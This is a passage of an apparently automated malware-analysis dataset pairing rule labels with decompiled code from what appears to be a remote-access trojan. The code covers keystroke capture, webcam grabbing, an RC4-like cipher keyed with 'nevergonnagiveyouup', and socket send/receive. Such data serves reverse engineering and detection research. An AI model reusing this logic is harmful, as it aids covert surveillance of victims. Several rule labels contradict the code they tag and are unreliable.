        "decompiled_code": "\nuint * __fastcall fcn.0040b8c7(uint *param_1, uint8_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    uint lpKeyState;\n    \n    uVar3 = param_2;\n    *param_1 = 0;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    param_1[3] = 0;\n    if (uVar3 < 100) {\n        if (uVar3 == 99) goto code_r0x0040ba22;\n        if (uVar3 < 0x25) {\n            if (uVar3 == 0x24) goto code_r0x0040ba22;\n            if (uVar3 < 0x13) {\n                if (((uVar3 == 0x12) || (uVar3 == 8)) || (uVar3 == 9)) goto code_r0x0040ba22;\n                iVar1 = uVar3 - 0xd;\n                goto code_r0x0040b91c;\n            }\n            if (uVar3 == 0x14) goto code_r0x0040ba22;\n            iVar1 = uVar3 - 0x20;\n            bVar4 = iVar1 == 0;\n            goto code_r0x0040b9da;\n        }\n        if (0x5b < uVar3) {\n            if (uVar3 == 0x5c) goto code_r0x0040ba22;\n            iVar1 = uVar3 - 0x60;\n            goto code_r0x0040b9df;\n        }\n        if ((((uVar3 == 0x5b) || (uVar3 == 0x25)) || (uVar3 == 0x26)) || ((uVar3 == 0x27 || (uVar3 == 0x28))))\n        goto code_r0x0040ba22;\n        bVar4 = uVar3 == 0x2e;\n    }\n    else {\n        if (uVar3 < 0xbb) {\n            if (uVar3 == 0xba) goto code_r0x0040ba22;\n            if (uVar3 < 0x6a) {\n                if (uVar3 == 0x69) goto code_r0x0040ba22;\n                iVar1 = uVar3 - 100;\n                goto code_r0x0040b9a2;\n            }\n            if ((uVar3 == 0xad) || (uVar3 == 0xae)) goto code_r0x0040ba22;\n            iVar1 = uVar3 - 0xaf;\ncode_r0x0040b91c:\n            if (iVar1 == 0) goto code_r0x0040ba22;\n            iVar1 = iVar1 + -3;\n        }\n        else {\n            if (0xc0 < uVar3) {\n                iVar1 = uVar3 - 0xdb;\n                bVar4 = iVar1 == 0;\n                goto code_r0x0040b9da;\n            }\n            if (uVar3 == 0xc0) goto code_r0x0040ba22;\n            iVar1 = uVar3 - 0xbb;\ncode_r0x0040b9a2:\n            if (iVar1 == 0) goto code_r0x0040ba22;\n            iVar1 = iVar1 + -1;\n            bVar4 = iVar1 == 0;\ncode_r0x0040b9da:\n            if (bVar4) goto code_r0x0040ba22;\n            iVar1 = iVar1 + -1;\ncode_r0x0040b9df:\n            if (iVar1 == 0) goto code_r0x0040ba22;\n            iVar1 = iVar1 + -1;\n        }\n        if (iVar1 == 0) goto code_r0x0040ba22;\n        bVar4 = iVar1 == 1;\n    }\n    if (!bVar4) {\n        fcn.00401293(&lpKeyState, 0, 0x100);\n        uVar2 = (*_sym.imp.USER32.dll_MapVirtualKeyA)(uVar3, 0);\n        (*_sym.imp.USER32.dll_ToUnicode)(uVar3, uVar2, &lpKeyState, param_1 + 2, 1, 0);\n        return param_1;\n    }\ncode_r0x0040ba22:\n    param_1[1] = uVar3;\n    return param_1;\n}\n",
        "token_count": 1019
    },
    "00402489": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00402489(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    for (iVar1 = *(param_1 + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n        fcn.00404081();\n    }\n    fcn.00406f8d();\n    return param_1 + -4;\n}\n",
        "token_count": 89
    },
    "0041411e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041411e(int16_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack28;\n    int16_t *arg_8h_00;\n    int16_t *piVar6;\n    \n    piVar6 = arg_8h;\n    *(in_ECX + 0x20) = arg_8h;\n    if ((*arg_8h == 0x5a4d) && (piVar2 = *(arg_8h + 0x1e) + arg_8h,  *piVar2 == 0x4550)) {\n        if (*(piVar2 + 1) == 0x14c) {\n            *(in_ECX + 0x40) = 1;\n            *(in_ECX + 0x24) = piVar2;\n            uStack28 = 0x41416f;\n            fcn.00403fc7(arg_8h, piVar2[0x15]);\n            iVar1 = *(in_ECX + 0x24);\n            arg_8h = NULL;\n            iVar4 = iVar1 + 0x18 + *(iVar1 + 0x14);\n            if (*(iVar1 + 6) != 0) {\n                do {\n                    arg_8h_00 = piVar6;\n                    fcn.00414894(piVar6, iVar4);\n                    fcn.00402b7b(arg_8h_00, iVar4, &stack0xffffffb8, uStack72, uStack68, uStack64, uStack60, uStack56, \n                                 uStack52, uStack48, uStack44);\n                    iVar4 = iVar4 + 0x28;\n                    arg_8h = arg_8h + 1;\n                } while (arg_8h < *(*(in_ECX + 0x24) + 6));\n            }\n        }\n        else if (*(piVar2 + 1) == -0x799c) {\n            iVar5 = 0;\n            *(in_ECX + 0x28) = piVar2;\n            *(in_ECX + 0x40) = 0;\n            uStack28 = 0x4141d5;\n            fcn.00403fc7(arg_8h, piVar2[0x15]);\n            iVar1 = *(in_ECX + 0x28);\n            iVar4 = *(iVar1 + 0x14) + 0x18 + iVar1;\n            if (*(iVar1 + 6) != 0) {\n                do {\n                    piVar6 = arg_8h;\n                    fcn.00414894(arg_8h, iVar4);\n                    fcn.00402b7b(piVar6, iVar4, &stack0xffffffb8, uStack72, uStack68, uStack64, uStack60, uStack56, \n                                 uStack52, uStack48, uStack44);\n                    iVar5 = iVar5 + 1;\n                    iVar4 = iVar4 + 0x28;\n                } while (iVar5 < *(*(in_ECX + 0x28) + 6));\n            }\n        }\n        uVar3 = 1;\n        *(in_ECX + 0x3c) = 1;\n    }\n    else {\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 823
    },
    "004024bb": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004024bb(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t *in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    if ((in_ECX[3] != 0) && (in_ECX[4] != 0)) {\n        in_ECX[1] = 0;\n        uVar5 = 0;\n        *in_ECX = 0;\n        do {\n            *((uVar5 & 0xff) + in_ECX[3]) = *in_ECX;\n            uVar5 = *in_ECX + 1;\n            *in_ECX = uVar5;\n        } while (uVar5 < 0x100);\n        *in_ECX = 0;\n        uVar5 = 0;\n        do {\n            uVar4 = in_ECX[3];\n            in_ECX[1] = in_ECX[1] + *(uVar5 % 0xfa + in_ECX[4]) + *((uVar5 & 0xff) + uVar4);\n            puVar1 = (uVar5 & 0xff) + uVar4;\n            *puVar1 = *puVar1 ^ *((in_ECX[1] & 0xff) + uVar4);\n            puVar1 = *(in_ECX + 1) + in_ECX[3];\n            *puVar1 = *puVar1 ^ *(*in_ECX + in_ECX[3]);\n            puVar1 = *in_ECX + in_ECX[3];\n            *puVar1 = *puVar1 ^ *(*(in_ECX + 1) + in_ECX[3]);\n            uVar5 = *in_ECX + 1;\n            *in_ECX = uVar5;\n        } while (uVar5 < 0x100);\n        *in_ECX = 0;\n        in_ECX[1] = 0;\n        if (in_ECX[2] != 0) {\n            uVar5 = 0;\n            do {\n                *in_ECX = uVar5 + 1;\n                uVar4 = in_ECX[3];\n                uVar5 = uVar5 + 1 & 0xff;\n                cVar2 = *(uVar5 + uVar4);\n                in_ECX[1] = in_ECX[1] + cVar2;\n                cVar3 = *((in_ECX[1] & 0xff) + uVar4);\n                *(uVar5 + uVar4) = cVar3;\n                *(*(in_ECX + 1) + in_ECX[3]) = cVar2;\n                uVar5 = in_ECX[1];\n                uVar4 = in_ECX[3];\n                *(var_8h + arg_8h) =\n                     *(var_8h + arg_8h) ^\n                     *(((*(((uVar5 >> 3 ^ *in_ECX << 5) & 0xff) + uVar4) +\n                         *(((*in_ECX >> 3 ^ uVar5 << 5) & 0xff) + uVar4) ^ 0xffffffaaU) & 0xff) + uVar4) +\n                     *((cVar2 + cVar3 & 0xffU) + uVar4) ^ *((uVar5 + cVar3 & 0xff) + uVar4);\n                var_8h = var_8h + 1;\n                *in_ECX = *in_ECX + 1;\n                uVar5 = *in_ECX;\n            } while (var_8h < in_ECX[2]);\n        }\n    }\n    return;\n}\n",
        "token_count": 863
    },
    "004073bd": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004073bd(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    \n    uVar2 = 0x80000000;\n    iVar1 = 0x1f;\n    do {\n        if ((uVar2 & *(*(param_1 + 0xc) + -4 + *(param_1 + 4) * 4)) != 0) {\n            return *(param_1 + 4) * 0x20 + -0x20 + iVar1;\n        }\n        uVar2 = uVar2 >> 1;\n        bVar3 = iVar1 != 0;\n        iVar1 = iVar1 + -1;\n    } while (bVar3);\n    return -1;\n}\n",
        "token_count": 178
    },
    "004083af": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004083af(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar2;\n    int32_t arg_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *(in_ECX + 0x14);\n    uVar2 = uVar1 + arg_8h * 8;\n    *(in_ECX + 0x14) = uVar2;\n    if (uVar2 < uVar1) {\n        *(in_ECX + 0x18) = *(in_ECX + 0x18) + 1;\n    }\n    uVar2 = uVar1 >> 3 & 0x3f;\n    *(in_ECX + 0x18) = *(in_ECX + 0x18) + (arg_8h >> 0x1d);\n    if (uVar2 + arg_8h < 0x40) {\n        arg_10h = 0;\n    }\n    else {\n        arg_10h = -uVar2 + 0x40;\n        fcn.0040126d(in_ECX + 0x1c + uVar2, in_EDX, arg_10h);\n        fcn.0040847a();\n        uVar2 = -uVar2 + 0x7f;\n        while( true ) {\n            if (arg_8h <= uVar2) break;\n            fcn.0040847a();\n            arg_10h = arg_10h + 0x40;\n            uVar2 = uVar2 + 0x40;\n        }\n        uVar2 = 0;\n    }\n    fcn.0040126d(in_ECX + 0x1c + uVar2, arg_10h + in_EDX, arg_8h - arg_10h);\n    return;\n}\n",
        "token_count": 436
    },
    "0041337b": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041337b(uint *param_1, uint *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(*param_1, 0, 2);\n    if (((iVar2 != -1) && (iVar3 = (*_sym.imp.KERNEL32.dll_FindResourceW)(iVar2, 1, 0x10),  iVar3 != 0)) &&\n       (iVar3 = (*_sym.imp.KERNEL32.dll_LoadResource)(iVar2, iVar3),  iVar3 != 0)) {\n        uVar1 = *(iVar3 + 0x28);\n        *param_2 = *(iVar3 + 0x14);\n        *(param_2 + 1) = *(iVar3 + 0x1a);\n        *(param_2 + 6) = *(iVar3 + 0x18);\n        param_2[2] = uVar1 & 1;\n        param_2[3] = uVar1 >> 1 & 1;\n        param_2[4] = uVar1 >> 3 & 1;\n        param_2[5] = uVar1 >> 5 & 1;\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar2);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 314
    },
    "00416bc6": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416bc6(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    \n    fcn.00406d65();\n    *(*(*(in_ECX + 4) + arg_8h * 4) + 0x10) = arg_10h;\n    fcn.00406d65();\n    *(*(*(in_ECX + 4) + arg_8h * 4) + 0x14) = arg_ch;\n    uVar1 = (arg_14h >> 3 & 0x1f) * arg_ch * arg_10h;\n    uVar2 = uVar1 >> 0x1f;\n    uVar2 = (uVar1 ^ uVar2) - uVar2;\n    if ((uVar2 & 0xf) != 0) {\n        uVar2 = (uVar2 & 0xfffffff0) + 0x10;\n    }\n    fcn.00406d65();\n    *(*(*(in_ECX + 4) + arg_8h * 4) + 0x18) = uVar2;\n    return;\n}\n",
        "token_count": 291
    },
    "00402b7b": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00402b7b(int32_t arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    uint var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    piVar1 = in_ECX[2];\n    if (in_ECX[1] <= piVar1) {\n        piVar3 = (piVar1 + 1U) * in_ECX[3];\n        piVar1 = fcn.00406fa7();\n        var_4h = NULL;\n        if (piVar1 == NULL) {\n            var_10h = NULL;\n        }\n        else {\n            *piVar1 = piVar3;\n            var_10h = piVar1 + 1;\n            if (piVar3 != NULL) {\n                piVar1 = piVar1 + 0xb;\n                piVar5 = piVar3;\n                do {\n                    *piVar1 = 0;\n                    piVar1[1] = 0;\n                    piVar5 = piVar5 + -1;\n                    piVar1 = piVar1 + 0xc;\n                } while (piVar5 != NULL);\n            }\n        }\n        piVar1 = in_ECX[2];\n        if (piVar1 != NULL) {\n            var_8h = 0;\n            piVar5 = var_10h;\n            do {\n                piVar1 = *in_ECX;\n                piVar4 = piVar1 + var_8h;\n                piVar6 = piVar5;\n                for (iVar2 = 10; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *piVar6 = *piVar4;\n                    piVar4 = piVar4 + 1;\n                    piVar6 = piVar6 + 1;\n                }\n                fcn.00403eca(piVar1 + var_8h + 10);\n                var_4h = var_4h + 1;\n                var_8h = var_8h + 0x30;\n                piVar1 = in_ECX[2];\n                piVar5 = piVar5 + 0xc;\n            } while (var_4h < piVar1);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00402489();\n            piVar1 = in_ECX[2];\n        }\n        *in_ECX = var_10h;\n        in_ECX[1] = piVar3;\n    }\n    piVar3 = &arg_8h;\n    piVar1 = *in_ECX + piVar1 * 0xc;\n    for (iVar2 = 10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *piVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n        piVar1 = piVar1 + 1;\n    }\n    fcn.00403eca(&arg_30h);\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.00404081();\n    return;\n}\n",
        "token_count": 810
    },
    "004106b1": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.004106b1(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint var_8h;\n    \n    puVar5 = NULL;\n    if (param_1 != NULL) {\n        puVar5 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x6c);\n        if (puVar5 != NULL) {\n            puVar1 = param_1;\n            puVar3 = puVar5;\n            for (iVar4 = 0xc; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = *puVar1;\n                puVar1 = puVar1 + 1;\n                puVar3 = puVar3 + 1;\n            }\n            puVar1 = puVar5[0xb] + param_1 + 0xc;\n            puVar5[0xc] = param_1 + 0xc;\n            puVar5[0xd] = *puVar1;\n            puVar5[0xe] = puVar1[1];\n            puVar5[0xf] = puVar1[2];\n            puVar5[0x10] = puVar1 + 3;\n            iVar4 = *(puVar5[0xf] + puVar1 + 3);\n            iVar2 = puVar1 + puVar5[0xf] + 0x10;\n            puVar5[0x11] = iVar4;\n            puVar5[0x12] = iVar2;\n            puVar3 = iVar2 + iVar4;\n            puVar1 = puVar3 + 3;\n            puVar5[0x13] = *puVar3;\n            puVar5[0x14] = puVar3[1];\n            puVar5[0x15] = puVar3[2];\n            puVar5[0x16] = puVar1;\n            iVar4 = *(puVar1 + puVar5[0x15]);\n            iVar2 = puVar5[0x15] + 4 + puVar1;\n            puVar5[0x17] = iVar4;\n            puVar5[0x18] = iVar2;\n            puVar5[0x19] = *(iVar2 + iVar4);\n            puVar5[0x1a] = iVar4 + 4 + iVar2;\n            fcn.0041079b(puVar5[0xb], 0);\n            fcn.0041079b(puVar5[0xf], 0);\n            fcn.0041079b(puVar5[0x11], 0);\n            fcn.0041079b(puVar5[0x15], 0);\n            fcn.0041079b(puVar5[0x17], 0);\n            fcn.0041079b(puVar5[0x19], 0);\n        }\n    }\n    return puVar5;\n}\n",
        "token_count": 675
    },
    "00414091": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414091(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch_00;\n    uint var_3ch;\n    uint var_14h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    arg_ch_00 = 0;\n    if (*(in_ECX + 0x34) != 0) {\n        var_ch = in_ECX + 0x2c;\n        var_8h = 0;\n        do {\n            iVar1 = var_8h;\n            fcn.00406d65();\n            fcn.004148d1(*(in_ECX + 0x2c) + iVar1);\n            fcn.0040434f(&var_3ch);\n            iVar1 = fcn.00404333(arg_ch);\n            fcn.00406f1d();\n            fcn.00404081();\n            if (iVar1 != 0) {\n                fcn.00402c80(arg_8h, arg_ch_00);\n                return;\n            }\n            arg_ch_00 = arg_ch_00 + 1;\n            var_8h = var_8h + 0x30;\n        } while (arg_ch_00 < *(in_ECX + 0x34));\n    }\n    return;\n}\n",
        "token_count": 309
    },
    "004167ca": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004167ca(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint var_dch;\n    int32_t var_98h;\n    uint var_94h;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint var_84h;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ah;\n    int32_t *var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    \n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    pcVar1 = _sym.imp.ole32.dll_CoCreateInstance;\n    var_8h = NULL;\n    var_ch = NULL;\n    piVar4 = NULL;\n    var_10h = NULL;\n    piVar3 = NULL;\n    var_14h = NULL;\n    (*_sym.imp.ole32.dll_CoCreateInstance)(0x4193e0, 0, 1, 0x41c890, &var_14h);\n    if (var_14h != NULL) {\n        (***var_14h)(var_14h, 0x4193c0, &var_ch);\n        if (var_ch != NULL) {\n            (**(*var_ch + 4))(var_ch);\n            fcn.00416af8();\n            if (var_8h == NULL) goto code_r0x00416948;\n            (*pcVar1)(0x419430, 0, 1, 0x41c880, &var_10h);\n            if (var_10h != NULL) {\n                (**(*var_10h + 0xc))(var_10h, var_8h, L\"Source\");\n                (**(*var_10h + 0xc))(var_10h, var_ch, L\"Grabber\");\n                fcn.00401293(&var_94h, 0, 0x48);\n                var_94h = *0x419470;\n                uStack148 = *0x419474;\n                uStack144 = *0x419478;\n                uStack140 = *0x41947c;\n                var_84h = *0x419450;\n                uStack132 = *0x419454;\n                uStack128 = *0x419458;\n                uStack124 = *0x41945c;\n                (**(*var_14h + 0x10))(var_14h, &var_94h);\n                piVar4 = fcn.00416718();\n                var_1ch = piVar4;\n                if (piVar4 != NULL) {\n                    piVar3 = fcn.00416734();\n                    if (piVar3 != NULL) {\n                        iVar2 = (**(*var_10h + 0x2c))(var_10h, piVar4, piVar3);\n                        if (-1 < iVar2) {\n                            (**(*var_14h + 0x14))(var_14h, &var_dch);\n                            puVar5 = var_98h + 0x30;\n                            puVar6 = &var_48h;\n                            for (iVar2 = 10; iVar2 != 0; iVar2 = iVar2 + -1) {\n                                *puVar6 = *puVar5;\n                                puVar5 = puVar5 + 1;\n                                puVar6 = puVar6 + 1;\n                            }\n                            fcn.00416540();\n                            fcn.00416bc6(arg_8h, var_40h, var_44h, var_3ah);\n                            piVar4 = var_1ch;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    if (var_8h != NULL) {\n        (**(*var_8h + 8))(var_8h);\n        var_8h = NULL;\n    }\ncode_r0x00416948:\n    if (var_ch != NULL) {\n        (**(*var_ch + 8))(var_ch);\n        var_ch = NULL;\n    }\n    if (var_10h != NULL) {\n        (**(*var_10h + 8))(var_10h);\n        var_10h = NULL;\n    }\n    if (var_14h != NULL) {\n        (**(*var_14h + 8))(var_14h);\n        var_14h = NULL;\n    }\n    if (piVar4 != NULL) {\n        (**(*piVar4 + 8))(piVar4);\n    }\n    if (piVar3 != NULL) {\n        (**(*piVar3 + 8))(piVar3);\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    return;\n}\n",
        "token_count": 1122
    },
    "004035cc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004035cc(int32_t pNodeName)\n\n{\n    uint arg_10h;\n    int32_t arg_14h;\n    uint in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint noname_0;\n    uint pHints;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_ch;\n    int32_t ppResult;\n    \n    arg_10h = *(pNodeName + 4);\n    fcn.00406d2f(&var_ch);\n    fcn.0040456d(&pNodeName);\n    fcn.00406f1d();\n    arg_14h = (*_sym.imp.WS2_32.dll_inet_addr)(pNodeName);\n    noname_0 = extraout_ECX;\n    if (arg_14h == -1) {\n        var_24h = 1;\n        var_20h = 6;\n        ppResult = 0;\n        pHints = 0;\n        _var_1ch = 0;\n        _var_14h = 0;\n        var_28h = 0;\n        (*_sym.imp.WS2_32.dll_getaddrinfo)(pNodeName, 0, &pHints, &ppResult);\n        arg_14h = *(*(ppResult + 0x18) + 4);\n        noname_0 = extraout_ECX_00;\n    }\n    fcn.004180c4(noname_0, in_ECX, arg_10h, arg_14h);\n    fcn.00406f1d();\n    return;\n}\n",
        "token_count": 389
    },
    "0040661e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040661e(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    bool bVar3;\n    uint *arg_8h_00;\n    uint arg_10h;\n    uint uVar4;\n    uint uVar5;\n    uint var_14h;\n    uint buf;\n    uint var_8h;\n    \n    if (*(in_ECX + 0xc) == -1) {\n        bVar3 = false;\n    }\n    else {\n        uVar1 = fcn.0040434f(\"nevergonnagiveyouup\");\n        fcn.0040403b(uVar1);\n        fcn.00406f1d();\n        iVar2 = arg_8h;\n        uVar4 = extraout_ECX;\n        uVar5 = extraout_ECX;\n        fcn.00404094(arg_8h);\n        arg_8h_00 = &var_14h;\n        uVar1 = extraout_ECX_00;\n        arg_10h = extraout_ECX_00;\n        fcn.00404094(arg_8h_00);\n        fcn.0040709b(arg_8h_00, uVar1, arg_10h, iVar2);\n        iVar2 = (*_sym.imp.WS2_32.dll_send)(*(in_ECX + 0xc), buf, *(arg_8h + 4), 0, uVar4, uVar5);\n        bVar3 = iVar2 != -1;\n        fcn.00404081();\n        fcn.00404081();\n    }\n    return bVar3;\n}\n",
        "token_count": 386
    },
    "004066a8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004066a8(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint arg_ch_00;\n    uint auStackY65592 [16378];\n    uint uStackY80;\n    uint *arg_8h_00;\n    uint uVar3;\n    uint arg_10h;\n    uint *puVar4;\n    uchar *var_30h;\n    int32_t var_28h;\n    uint var_20h;\n    uint optname;\n    uint *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    \n    fcn.00401230();\n    if (*(extraout_ECX + 0xc) != -1) {\n        var_10h = 4;\n        var_14h = &fcn.004066a8::optname;\n        optname = 0x1006;\n        (*_sym.imp.WS2_32.dll_setsockopt)();\n        var_30h = 0x4066f5;\n        fcn.00401293();\n        var_28h = fcn.0040434f(\"nevergonnagiveyouup\");\n        fcn.0040403b(var_28h);\n        fcn.00406f1d();\n        var_ch = 0;\n        var_8h = 0;\n        do {\n            var_30h = 0xc;\n            arg_ch = (*_sym.imp.WS2_32.dll_recv)();\n            if (arg_ch == 0xc) {\n                var_30h = &stack0xfffeffc8;\n                var_14h = NULL;\n                var_10h = 0;\n                fcn.00403fc7(var_30h, 0xc);\n                puVar4 = &fcn.004066a8::var_14h;\n                fcn.00404094(puVar4);\n                arg_8h_00 = &fcn.004066a8::var_30h;\n                uStackY80 = 0x40676a;\n                uVar3 = extraout_ECX_00;\n                arg_10h = extraout_ECX_00;\n                fcn.00404094(arg_8h_00);\n                uStackY80 = 0x406772;\n                fcn.0040709b(arg_8h_00, uVar3, arg_10h, puVar4);\n                iVar1 = *(var_28h + 4);\n                if (iVar1 != 0) {\n                    do {\n                        uStackY80 = 0x40679b;\n                        iVar2 = (*_sym.imp.WS2_32.dll_recv)();\n                        if (iVar2 == -1) {\n                            fcn.00404081();\n                            if (var_14h != NULL) {\n                                fcn.00406f66();\n                            }\n                            goto code_r0x00406862;\n                        }\n                        arg_ch = arg_ch + iVar2;\n                    } while (iVar1 + 0xc != arg_ch);\n                }\n                fcn.00404081();\n                if (var_14h != NULL) {\n                    fcn.00406f66();\n                }\n            }\n            else if (arg_ch == -1) break;\n            var_14h = &stack0xfffeffc8;\n            optname = 0x4067dd;\n            var_10h = arg_ch;\n            fcn.00403fc7(var_14h, arg_ch);\n            optname = extraout_ECX_01;\n            fcn.00404094(&fcn.004066a8::var_ch);\n            puVar4 = &fcn.004066a8::var_30h;\n            var_30h = 0x4067f7;\n            uVar3 = arg_ch_00;\n            fcn.00404094(puVar4);\n            var_30h = 0x4067ff;\n            fcn.0040709b(puVar4, arg_ch_00, uVar3, &fcn.004066a8::var_ch);\n            fcn.00403ffa();\n            fcn.00403fc7(arg_ch, arg_ch);\n            if (var_ch != 0) {\n                fcn.00406f66();\n            }\n            var_ch = 0;\n            var_8h = 0;\n            fcn.00403ffa();\n            var_28h = arg_8h;\n            fcn.00405f6c(arg_8h);\n            fcn.00404081();\n        } while (0 < arg_ch);\ncode_r0x00406862:\n        fcn.00404081();\n    }\n    return;\n}\n",
        "token_count": 1170
    },
    "00406871": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
